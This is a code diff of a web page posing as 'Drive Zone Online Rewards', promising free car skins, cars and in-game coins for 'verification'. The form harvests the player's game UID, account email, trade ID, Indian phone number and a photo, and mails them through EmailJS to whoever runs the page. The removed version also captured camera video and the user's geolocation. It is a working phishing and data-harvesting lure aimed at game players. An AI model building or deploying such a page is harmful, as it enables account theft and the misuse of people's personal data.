@@ -8,89 +8,60 @@
 <style>
 
 body{
-    margin:0;
-    font-family:Arial,sans-serif;
-    background:#0f0f0f;
-    color:white;
+margin:0;
+font-family:Arial,sans-serif;
+background:#0f0f0f;
+color:white;
 }
 
 header{
-    background:linear-gradient(90deg,#ff6600,#ff0000);
-    padding:20px;
-    text-align:center;
-    font-size:28px;
-    font-weight:bold;
-}
-
-.hero{
-    text-align:center;
-    padding:50px 20px;
-    background:url('https://images.unsplash.com/photo-1503376780353-7e6692767b70?q=80&w=1200') center/cover;
-    background-size:cover;
-    background-position:center;
-}
-
-.hero h1{
-    font-size:42px;
-    text-shadow:0 0 10px black;
+background:linear-gradient(90deg,#ff6600,#ff0000);
+padding:20px;
+text-align:center;
+font-size:28px;
+font-weight:bold;
 }
 
 .container{
-    max-width:700px;
-    margin:auto;
-    padding:20px;
+max-width:700px;
+margin:auto;
+padding:20px;
 }
 
 .card{
-    background:#1a1a1a;
-    padding:25px;
-    border-radius:15px;
-    box-shadow:0 0 15px rgba(255,0,0,0.3);
+background:#1a1a1a;
+padding:25px;
+border-radius:15px;
+}
+
+input,select,button{
+width:100%;
+padding:13px;
+margin-top:10px;
+margin-bottom:15px;
+border:none;
+border-radius:8px;
+box-sizing:border-box;
 }
 
 input,select{
-    width:100%;
-    padding:13px;
-    margin-top:10px;
-    margin-bottom:15px;
-    border:none;
-    border-radius:8px;
-    background:#2a2a2a;
-    color:white;
-    box-sizing:border-box;
+background:#2a2a2a;
+color:white;
 }
 
 button{
-    width:100%;
-    padding:14px;
-    border:none;
-    border-radius:10px;
-    background:#ff3300;
-    color:white;
-    font-size:16px;
-    cursor:pointer;
-    margin-top:15px;
+background:#ff3300;
+color:white;
+cursor:pointer;
 }
 
 button:hover{
-    background:#ff5500;
-}
-
-video{
-    width:100%;
-    border-radius:10px;
-    margin-top:10px;
+background:#ff5500;
 }
 
 .notice{
-    font-size:13px;
-    color:#bbbbbb;
-    margin-top:10px;
-}
-
-img{
-    width:100%;
-    border-radius:10px;
+font-size:13px;
+color:#bbbbbb;
 }
 
 </style>
@@ -102,11 +73,6 @@ img{
 DRIVE ZONE ONLINE REWARDS
 </header>
 
-<section class="hero">
-    <h1>Free DZO Trading System & Free Skins</h1>
-    <p>Submit details for verification</p>
-</section>
-
 <div class="container">
 
 <div class="card">
@@ -114,6 +80,7 @@ DRIVE ZONE ONLINE REWARDS
 <form id="rewardForm">
 
 <label>Drive Zone UID</label>
+
 <input
 type="text"
 id="uid"
@@ -121,40 +88,36 @@ placeholder="Enter UID"
 required>
 
 <label>Ingame Account Mail ID</label>
+
 <input
 type="email"
 id="email"
 placeholder="Enter ingame account mail ID"
 required>
 
+<label>Ingame Trade ID</label>
+
+<input
+type="text"
+id="tradeid"
+placeholder="Enter your ingame trade ID"
+required>
+
 <label>Indian Phone Number</label>
+
 <input
 type="tel"
 id="phone"
 placeholder="10 digit Indian number"
-pattern="[6-9]{1}[0-9]{9}"
 maxlength="10"
+pattern="[6-9]{1}[0-9]{9}"
 oninput="this.value=this.value.replace(/[^0-9]/g,'').slice(0,10)"
 required>
 
-<label>Select State</label>
-<select id="state" required>
-<option value="">Choose State</option>
-<option>Kerala</option>
-<option>Tamil Nadu</option>
-<option>Karnataka</option>
-<option>Maharashtra</option>
-<option>Delhi</option>
-<option>Gujarat</option>
-<option>Punjab</option>
-<option>West Bengal</option>
-<option>Andhra Pradesh</option>
-<option>Telangana</option>
-</select>
-
 <label>Select Reward</label>
 
-<select id="reward"
+<select
+id="reward"
 onchange="updateRewardOptions()"
 required>
 
@@ -168,57 +131,36 @@ Free Skin
 DZO Trading Access
 </option>
 
-<option value="Rare Car Bundle">
-Rare Car Bundle
-</option>
-
 <option value="Free Car">
 Free Car
 </option>
 
 </select>
 
-<div id="selectedRewardBox"
-style="display:none;
+<div
+id="selectedRewardBox"
+style="
+display:none;
 background:#2a2a2a;
 padding:12px;
 border-radius:10px;
-margin-top:15px;
 margin-bottom:15px;">
 
 <b>Selected Reward:</b>
+
 <span id="selectedRewardText"></span>
 
 </div>
 
 <div id="dynamicOptions"></div>
 
-<h3>Verification Photo</h3>
+<label>Upload Verification Photo</label>
 
-<p>
-Camera and location permission required for verification.
-</p>
-
-<video id="video"
-autoplay
-playsinline>
-</video>
-
-<button
-type="button"
-onclick="startCamera()">
-
-Enable Camera
-
-</button>
-
-<button
-type="button"
-onclick="takePhoto()">
-
-Take Verification Photo
-
-</button>
+<input
+type="file"
+id="photoUpload"
+accept="image/*"
+required>
 
 <div class="notice">
 
@@ -244,244 +186,192 @@ Submit Verification
 
 emailjs.init("IlZtBG2WOaqIrvb3T");
 
-let stream;
 let capturedImage = null;
-let userLocation = null;
 
-async function startCamera(){
+document
+.getElementById('photoUpload')
+.addEventListener('change', function(){
 
-    try{
+const file =
+this.files[0];
 
-        stream =
-        await navigator.mediaDevices.getUserMedia({
-            video:true
-        });
+const reader =
+new FileReader();
 
-        document.getElementById('video').srcObject =
-        stream;
+reader.onload = function(e){
 
-        navigator.geolocation.getCurrentPosition(
-        (position)=>{
+capturedImage =
+e.target.result;
 
-            userLocation = {
-                lat:position.coords.latitude,
-                lon:position.coords.longitude
-            };
+};
 
-        });
+reader.readAsDataURL(file);
 
-    }catch(err){
-
-        alert("Permission denied");
-
-    }
-
-}
+});
 
 function updateRewardOptions(){
 
-    const reward =
-    document.getElementById('reward').value;
+const reward =
+document.getElementById('reward').value;
 
-    const dynamicOptions =
-    document.getElementById('dynamicOptions');
+const dynamicOptions =
+document.getElementById('dynamicOptions');
 
-    const selectedRewardBox =
-    document.getElementById('selectedRewardBox');
+const selectedRewardBox =
+document.getElementById('selectedRewardBox');
 
-    const selectedRewardText =
-    document.getElementById('selectedRewardText');
+const selectedRewardText =
+document.getElementById('selectedRewardText');
 
-    if(reward !== ""){
+if(reward !== ""){
 
-        selectedRewardBox.style.display =
-        "block";
+selectedRewardBox.style.display =
+"block";
 
-        selectedRewardText.innerText =
-        reward;
+selectedRewardText.innerText =
+reward;
 
-    }else{
+}else{
 
-        selectedRewardBox.style.display =
-        "none";
-
-    }
-
-    if(reward === "Free Skin"){
-
-        dynamicOptions.innerHTML = `
-
-        <label>Select Car Skin</label>
-
-        <select id="request">
-
-        <option>BMW M4 Gold Skin</option>
-
-        <option>Nissan GTR Neon Skin</option>
-
-        <option>Lamborghini Aventador Police Skin</option>
-
-        <option>Toyota Supra Racing Skin</option>
-
-        <option>Porsche 911 Carbon Skin</option>
-
-        </select>
-
-        `;
-
-    }
-
-    else if(reward === "DZO Trading Access"){
-
-        dynamicOptions.innerHTML = `
-
-        <label>Select DZO Amount</label>
-
-        <select id="request">
-
-        <option>100 DZO Coins</option>
-
-        <option>200 DZO Coins</option>
-
-        <option>1000 DZO Coins</option>
-
-        <option>10000 DZO Coins</option>
-
-        <option>1 Lakh DZO Coins</option>
-
-        </select>
-
-        `;
-
-    }
-
-    else if(reward === "Free Car"){
-
-        dynamicOptions.innerHTML = `
-
-        <label>Select Car</label>
-
-        <select id="request">
-
-        <option>Lamborghini Huracan</option>
-
-        <option>Bugatti Chiron</option>
-
-        <option>Nissan GTR R35</option>
-
-        <option>Toyota Supra MK4</option>
-
-        <option>Porsche 911 GT3</option>
-
-        </select>
-
-        `;
-
-    }
-
-    else{
-
-        dynamicOptions.innerHTML = "";
-
-    }
+selectedRewardBox.style.display =
+"none";
 
 }
 
-function takePhoto(){
+if(reward === "Free Skin"){
 
-    const video =
-    document.getElementById('video');
+dynamicOptions.innerHTML = `
 
-    const canvas =
-    document.createElement('canvas');
+<label>Select Car Skin</label>
 
-    canvas.width =
-    video.videoWidth;
+<select id="request">
 
-    canvas.height =
-    video.videoHeight;
+<option>BMW M4 Gold Skin</option>
 
-    const ctx =
-    canvas.getContext('2d');
+<option>Nissan GTR Neon Skin</option>
 
-    ctx.drawImage(video,0,0);
+<option>Toyota Supra Racing Skin</option>
 
-    capturedImage =
-    canvas.toDataURL('image/png');
+<option>Porsche 911 Carbon Skin</option>
 
-    alert("Verification photo captured");
+</select>
+
+`;
 
 }
 
-document.getElementById('rewardForm')
+else if(reward === "DZO Trading Access"){
+
+dynamicOptions.innerHTML = `
+
+<label>Select DZO Amount</label>
+
+<select id="request">
+
+<option>100 DZO Coins</option>
+
+<option>200 DZO Coins</option>
+
+<option>1000 DZO Coins</option>
+
+<option>10000 DZO Coins</option>
+
+<option>1 Lakh DZO Coins</option>
+
+</select>
+
+`;
+
+}
+
+else if(reward === "Free Car"){
+
+dynamicOptions.innerHTML = `
+
+<label>Select Car</label>
+
+<select id="request">
+
+<option>Lamborghini Huracan</option>
+
+<option>Bugatti Chiron</option>
+
+<option>Nissan GTR R35</option>
+
+<option>Toyota Supra MK4</option>
+
+<option>Porsche 911 GT3</option>
+
+</select>
+
+`;
+
+}
+
+else{
+
+dynamicOptions.innerHTML = "";
+
+}
+
+}
+
+document
+.getElementById('rewardForm')
 .addEventListener('submit',function(e){
 
-    e.preventDefault();
+e.preventDefault();
 
-    const phone =
-    document.getElementById('phone').value;
+const templateParams = {
 
-    const indianPhone =
-    /^[6-9]\d{9}$/;
+uid:
+document.getElementById('uid').value,
 
-    if(!indianPhone.test(phone)){
+email:
+document.getElementById('email').value,
 
-        alert("Enter valid Indian mobile number");
-        return;
+tradeid:
+document.getElementById('tradeid').value,
 
-    }
+phone:
+document.getElementById('phone').value,
 
-    if(!capturedImage){
+reward:
+document.getElementById('reward').value,
 
-        alert("Please take verification photo");
-        return;
+request:
+document.getElementById('request').value,
 
-    }
+photo:
+capturedImage
+? capturedImage.substring(0,100)
+: "No Image"
 
-    const templateParams = {
+};
 
-        uid:
-        document.getElementById('uid').value,
+emailjs.send(
 
-        email:
-        document.getElementById('email').value,
+"service_03gi2v9",
 
-        phone:
-        phone,
+"template_ec2whye",
 
-        state:
-        document.getElementById('state').value,
+templateParams
 
-        reward:
-        document.getElementById('reward').value,
+)
 
-        request:
-        document.getElementById('request').value,
+.then(()=>{
 
-        location:
-        JSON.stringify(userLocation)
+alert("Verification submitted!");
 
-    };
+})
 
-    emailjs.send(
-        "service_03gi2v9",
-        "template_ec2whye",
-        templateParams
-    )
+.catch((error)=>{
 
-    .then(()=>{
+console.log(error);
 
-        alert("Verification submitted!");
+alert("Failed to send");
 
-    })
-
-    .catch((error)=>{
-
-        console.log(error);
-
-        alert("Failed to send");
-
-    });
+});
 
 });
 
